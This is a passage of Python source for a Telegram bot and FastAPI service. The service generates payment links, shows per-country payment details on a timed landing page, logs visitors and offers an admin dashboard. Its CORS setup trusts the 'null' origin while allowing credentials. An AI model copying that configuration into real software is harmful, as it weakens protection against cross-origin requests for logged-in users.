        await update.effective_message.reply_text("Нужно 2 строки: имя менеджера и Telegram-ссылка.")
        return WAITING_MANAGER

    manager_link = "" if lines[1] == "-" else lines[1]
    selected_geo = get_selected_geo(context)
    update_geo_manager(selected_geo, lines[0], manager_link)
    await update.effective_message.reply_text(
        f"Менеджер для {selected_geo} обновлен.\n\n{build_geo_details_text(selected_geo)}",
        reply_markup=main_keyboard(),
    )
    return ConversationHandler.END


async def create_link_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not await admin_check(update):
        return ConversationHandler.END
    selected_geo = get_selected_geo(context)
    await update.effective_message.reply_text(
        f"Текущий GEO: {selected_geo}\nВведите сумму к оплате, например: 250"
    )
    return WAITING_LINK_AMOUNT


async def create_link_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    amount = parse_payment_amount(update.effective_message.text)
    if amount is None:
        await update.effective_message.reply_text("Нужно ввести положительную сумму, например: 250")
        return WAITING_LINK_AMOUNT

    context.user_data["temp_amount"] = amount
    await update.effective_message.reply_text(
        "Введите назначение платежа или отправьте - если оно не нужно."
    )
    return WAITING_LINK_LABEL


async def create_link_label(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    amount = float(context.user_data.get("temp_amount", 0))
    selected_geo = get_selected_geo(context)
    label = update.effective_message.text.strip()
    clean_label = "" if label == "-" else label
    link = build_payment_link(amount, selected_geo, clean_label)
    context.user_data.pop("temp_amount", None)
    await update.effective_message.reply_text(
        f"Ссылка готова.\n\n"
        f"GEO: {selected_geo}\n"
        f"Сумма: {amount:.2f} {DEFAULT_CURRENCY}\n"
        f"Назначение: {clean_label or 'не указано'}\n"
        f"Ссылка: {link}",
        reply_markup=main_keyboard(),
    )
    return ConversationHandler.END


async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.effective_message.reply_text("Действие отменено.", reply_markup=main_keyboard())
    return ConversationHandler.END


if bot_app is not None:
    conv_handler_geo = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^🗺 Выбрать GEO$"), select_geo_start)],
        states={WAITING_GEO_SELECTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, select_geo_save)]},
        fallbacks=[CommandHandler("cancel", cancel_cmd)],
    )
    conv_handler_req = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^📝 Реквизиты$"), change_reqs_start)],
        states={WAITING_REQUISITES: [MessageHandler(filters.TEXT & ~filters.COMMAND, change_reqs_save)]},
        fallbacks=[CommandHandler("cancel", cancel_cmd)],
    )
    conv_handler_manager = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^👤 Менеджер$"), change_manager_start)],
        states={WAITING_MANAGER: [MessageHandler(filters.TEXT & ~filters.COMMAND, change_manager_save)]},
        fallbacks=[CommandHandler("cancel", cancel_cmd)],
    )
    conv_handler_link = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^🔗 Ссылка на оплату$"), create_link_start)],
        states={
            WAITING_LINK_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_link_amount)],
            WAITING_LINK_LABEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_link_label)],
        },
        fallbacks=[CommandHandler("cancel", cancel_cmd)],
    )

    bot_app.add_handler(CommandHandler("start", start_cmd))
    bot_app.add_handler(MessageHandler(filters.Regex("^📊 GEO статус$"), show_geo_status_cmd))
    bot_app.add_handler(conv_handler_geo)
    bot_app.add_handler(conv_handler_req)
    bot_app.add_handler(conv_handler_manager)
    bot_app.add_handler(conv_handler_link)


# --- FASTAPI ---
@asynccontextmanager
async def lifespan(app: FastAPI):
    global BOT_RUNTIME_ERROR, BOT_RUNTIME_STARTED

    if bot_app is not None:
        try:
            await bot_app.initialize()
            await bot_app.start()
            if bot_app.updater is not None:
                await bot_app.updater.start_polling()
            BOT_RUNTIME_STARTED = True
            BOT_RUNTIME_ERROR = None
        except Exception as exc:
            BOT_RUNTIME_STARTED = False
            BOT_RUNTIME_ERROR = str(exc)

    yield

    if bot_app is not None and BOT_RUNTIME_STARTED:
        try:
            if bot_app.updater is not None:
                await bot_app.updater.stop()
            await bot_app.stop()
            await bot_app.shutdown()
        except Exception:
            pass


app = FastAPI(lifespan=lifespan)
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://127.0.0.1:8000",
        "http://localhost:8000",
        WEB_URL,
        "null",
    ],
    allow_origin_regex=r"^https?://(localhost|127\.0\.0\.1)(:\d+)?$",
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.get("/")
async def landing_page() -> FileResponse:
    return FileResponse(STATIC_DIR / "index.html")


@app.get("/admin")
async def admin_page() -> FileResponse:
    return FileResponse(STATIC_DIR / "admin.html")


@app.get("/api/health")
async def healthcheck():
    return {
        "status": "ok",
        "bot": get_bot_status(),
        "database_exists": DB_FILE.exists(),
    }


@app.get("/api/landing-context")
async def landing_context(
    request: Request,
    payment: str | None = None,
    geo: str | None = None,
    label: str | None = None,
):
    visitor, browser_language = await build_visitor_context(request)
    resolved_geo = resolve_geo_code(geo, visitor.get("country_code"), browser_language)
    profile = get_geo_profile(resolved_geo)
    payment_amount = parse_payment_amount(payment)
    payment_label = (label or "").strip()
    mode = "live" if payment_amount is not None else ("preview" if ALLOW_PREVIEW_MODE else "invalid")
    requisites = get_active_requisites(resolved_geo) if mode != "invalid" else None
    refresh_seconds = max(60, int(profile["refresh_minutes"]) * 60) if mode != "invalid" else 0
    recommended_language = sanitize_language_code(profile["default_language"]) or "en"

    visit_token = record_visit(
        mode=mode,
        visitor=visitor,
        recommended_language=recommended_language,
        geo_code=resolved_geo,
        payment_amount=payment_amount,
        payment_label=payment_label or None,
        requisites=requisites,
        request=request,
    )

    return {
        "mode": mode,
        "recommended_language": recommended_language,
        "available_languages": LANGUAGE_OPTIONS,
        "payment": {
            "amount": payment_amount if payment_amount is not None else (DEFAULT_PREVIEW_AMOUNT if mode == "preview" else None),
            "currency": DEFAULT_CURRENCY,
            "label": payment_label,
        },
        "geo": {
            **profile,
            "refresh_seconds": refresh_seconds,
        },
        "requisites": requisites,
        "visit": {
            "token": visit_token,
            "client_first_name": "",
            "client_last_name": "",
        },
        "visitor": visitor,
        "timer": {
            "refresh_seconds": refresh_seconds,
            "expires_at": (utc_now() + timedelta(seconds=refresh_seconds)).isoformat() if refresh_seconds else None,
        },
    }


@app.post("/api/landing-client")
async def landing_client(payload: LandingClientPayload):
    client = save_landing_client(
        visit_token=payload.visit_token,
        first_name=payload.first_name,
        last_name=payload.last_name,
    )
    return {"ok": True, "client": client}


@app.get("/api/admin/session")
async def admin_session(request: Request):
    cleanup_sessions()
    token = request.cookies.get(SESSION_COOKIE_NAME)
    return {"authenticated": bool(token and token in ADMIN_SESSIONS)}


@app.post("/api/admin/login")
async def admin_login(payload: AdminLoginPayload):
    if payload.username != ADMIN_USERNAME or payload.password != ADMIN_PASSWORD:
        raise HTTPException(status_code=401, detail="Неверный логин или пароль")

    response = JSONResponse({"authenticated": True})
    session_token = create_admin_session()
    response.set_cookie(
        SESSION_COOKIE_NAME,
        session_token,
        httponly=True,
        samesite="lax",
        max_age=SESSION_TTL_HOURS * 3600,
    )
    return response


@app.post("/api/admin/logout")
async def admin_logout():
    response = JSONResponse({"ok": True})
    response.delete_cookie(SESSION_COOKIE_NAME)
    return response


@app.get("/api/admin/dashboard")
async def admin_dashboard(request: Request):
    ensure_admin_session(request)
    return {
        "generated_at": utc_now_iso(),
        "web_url": WEB_URL,
        "bot": get_bot_status(),
        "stats": get_summary_stats(),
        "geos": list_geo_snapshots(),
        "requisites_history": list_geo_requisites_history(),
        "visits": list_visits(),
        "languages": LANGUAGE_OPTIONS,
    }


@app.post("/api/admin/geos/{geo_code}")
async def admin_update_geo(geo_code: str, payload: GeoConfigPayload, request: Request):
    ensure_admin_session(request)
    snapshot = save_geo_configuration(geo_code, payload)
    return {"ok": True, "geo": snapshot}


STATIC_DIR.mkdir(exist_ok=True)
app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8000)
